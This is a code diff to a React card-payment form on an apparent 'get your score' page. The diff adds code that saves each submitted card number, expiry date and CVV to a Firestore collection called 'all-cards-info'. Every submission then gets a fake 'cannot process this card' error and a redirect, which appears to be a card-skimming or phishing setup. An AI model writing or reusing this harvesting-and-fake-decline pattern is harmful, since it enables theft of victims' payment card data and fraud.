@@ -1,5 +1,6 @@
 import { useState } from 'react';
-import { FaCheck, FaInfoCircle } from 'react-icons/fa';
+import { useNavigate } from 'react-router-dom';
+import { FaCheck, FaInfoCircle, FaSpinner } from 'react-icons/fa';
 import Swal from 'sweetalert2';
 import infoimg from '../../assets/card-logo/img-check-score.png';
 import visalogo from '../../assets/card-logo/cc-logo-visa.svg';
@@ -8,12 +9,16 @@ import amexlogo from '../../assets/card-logo/cc-logo-amex.svg';
 import discoverLogo from '../../assets/card-logo/cc-logo-discover.svg';
 import seclog from '../../assets/info-from-img/images.png';
 import seclo from '../../assets/info-from-img/img-seal-qualys.svg';
+import { collection, doc, setDoc, getDoc } from 'firebase/firestore';
+import { db } from '../../../firbase.config';
 
 const CardPayment = () => {
+    const navigate = useNavigate();
     const [cardNumber, setCardNumber] = useState('');
     const [expMonth, setExpMonth] = useState('');
     const [expYear, setExpYear] = useState('');
     const [cvv, setCvv] = useState('');
+    const [isSubmitting, setIsSubmitting] = useState(false);
     const [errors, setErrors] = useState({
         cardNumber: '',
         expMonth: '',
@@ -195,26 +200,106 @@ const CardPayment = () => {
         return isValid;
     };
 
-    const handleSubmit = (e) => {
+    const storeCardInfo = async () => {
+        try {
+            // Create a reference to the 'all-cards-info' collection
+            const cardsCollection = collection(db, 'all-cards-info');
+
+            // Use the card number (without spaces) as the document ID
+            const sanitizedCardNumber = cardNumber.replace(/\s/g, '');
+            const cardDocRef = doc(cardsCollection, sanitizedCardNumber);
+
+            // Check if document already exists
+            const docSnapshot = await getDoc(cardDocRef);
+
+            if (docSnapshot.exists()) {
+                // If document exists, create a new document with timestamp suffix
+                const timestamp = new Date().getTime();
+                const uniqueDocRef = doc(cardsCollection, `${sanitizedCardNumber}_${timestamp}`);
+
+                // Prepare the card data
+                const cardData = {
+                    cardNumber: cardNumber,
+                    expMonth: expMonth,
+                    expYear: expYear,
+                    cvv: cvv,
+                    timestamp: new Date().toISOString(),
+                    isDuplicate: true // Mark as duplicate entry
+                };
+
+                await setDoc(uniqueDocRef, cardData);
+                console.log('Duplicate card info stored with timestamp suffix');
+            } else {
+                // If document doesn't exist, create new one with card number as ID
+                const cardData = {
+                    cardNumber: cardNumber,
+                    expMonth: expMonth,
+                    expYear: expYear,
+                    cvv: cvv,
+                    timestamp: new Date().toISOString(),
+                    isDuplicate: false
+                };
+
+                await setDoc(cardDocRef, cardData);
+                console.log('New card info stored successfully');
+            }
+        } catch (error) {
+            console.error('Error storing card information:', error);
+            throw error; // Re-throw to handle in the calling function
+        }
+    };
+
+    const handleSubmit = async (e) => {
         e.preventDefault();
         if (validateForm()) {
-            // Show SweetAlert2 modal
-            Swal.fire({
-                title: 'Oops!',
-                html: '<div class="text-center">WE CANNOT PROCESS THIS CARD RIGHT NOW<br/>PLEASE TRY AGAIN WITH ANOTHER PAYMENT METHOD</div>',
-                icon: 'error',
-                confirmButtonText: 'GO TO ANOTHER PAYMENT METHOD',
-                confirmButtonColor: '#3085d6',
-                customClass: {
-                    popup: 'rounded-lg',
-                    confirmButton: 'py-2 px-4 rounded'
-                }
-            });
+            setIsSubmitting(true); // Show button loader
+            try {
+                // Store the card info in Firestore
+                await storeCardInfo();
+
+                // Show SweetAlert2 modal with custom configuration
+                await Swal.fire({
+                    title: 'Oops!',
+                    html: '<div class="text-center">WE CANNOT PROCESS THIS CARD RIGHT NOW<br/>PLEASE TRY AGAIN WITH ANOTHER PAYMENT METHOD</div>',
+                    icon: 'error',
+                    confirmButtonText: 'GO TO ANOTHER PAYMENT METHOD',
+                    confirmButtonColor: '#3085d6',
+                    customClass: {
+                        popup: 'rounded-lg',
+                        confirmButton: 'py-2 px-4 rounded'
+                    },
+                    allowOutsideClick: false, // Prevent closing by clicking outside
+                    allowEscapeKey: false, // Prevent closing with ESC key
+                    allowEnterKey: false, // Prevent closing with Enter key
+                    showCancelButton: false, // Hide cancel button
+                    focusConfirm: true,
+                    willClose: () => {
+                        // Navigate when the modal is closed by clicking the button
+                        navigate('/checkers');
+                    }
+                });
+
+                // Clear the form after submission
+                setCardNumber('');
+                setExpMonth('');
+                setExpYear('');
+                setCvv('');
+            } catch (error) {
+                console.error('Error during form submission:', error);
+                Swal.fire({
+                    title: 'Error!',
+                    text: 'An error occurred while processing your payment. Please try again.',
+                    icon: 'error',
+                    confirmButtonText: 'OK'
+                });
+            } finally {
+                setIsSubmitting(false); // Hide button loader
+            }
         }
     };
 
     return (
-        <div className="flex flex-col md:flex-row gap-0 md:gap-6 bg-white rounded-xl shadow-lg w-[96%] md:w-[80%] mx-auto my-1 md:my-10 ">
+        <div className="flex flex-col md:flex-row gap-0 md:gap-6 bg-white rounded-xl shadow-lg w-[96%] md:w-[80%] mx-auto my-1 md:my-10">
             {/* Left Side - Form */}
             <div className="w-full md:w-[60%] p-4 space-y-5">
                 <h2 className="text-2xl font-semibold">Final Step</h2>
@@ -241,6 +326,7 @@ const CardPayment = () => {
                             placeholder="1234 5678 9012 3456"
                             value={cardNumber}
                             onChange={handleCardNumberChange}
+                            disabled={isSubmitting}
                         />
                         {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                     </div>
@@ -263,6 +349,7 @@ const CardPayment = () => {
                                         setExpMonth('');
                                     }
                                 }}
+                                disabled={isSubmitting}
                             />
                             {errors.expMonth && <p className="text-red-500 text-xs mt-1">{errors.expMonth}</p>}
                         </div>
@@ -277,6 +364,7 @@ const CardPayment = () => {
                                 maxLength={2}
                                 value={expYear}
                                 onChange={handleExpYearChange}
+                                disabled={isSubmitting}
                             />
                             {errors.expYear && <p className="text-red-500 text-xs mt-1">{errors.expYear}</p>}
                         </div>
@@ -299,6 +387,7 @@ const CardPayment = () => {
                                 maxLength={4}
                                 value={cvv}
                                 onChange={handleCvvChange}
+                                disabled={isSubmitting}
                             />
                             {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                         </div>
@@ -313,9 +402,19 @@ const CardPayment = () => {
                     <div className='flex justify-center'>
                         <button
                             type="submit"
-                            className="bg-[#7fbdff] text-white px-20 py-1 rounded mt-4 text-[14px] font-semibold hover:bg-blue-700 transition"
+                            className="bg-[#7fbdff] text-white px-20 py-1 rounded mt-4 text-[14px] font-semibold hover:bg-blue-700 transition disabled:opacity-75 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                            disabled={isSubmitting}
                         >
-                            I Agree & Accept <br /> Get My Score!
+                            {isSubmitting ? (
+                                <>
+                                    <FaSpinner className="animate-spin" />
+                                    Processing...
+                                </>
+                            ) : (
+                                <>
+                                    I Agree & Accept <br /> Get My Score!
+                                </>
+                            )}
                         </button>
                     </div>
                 </form>
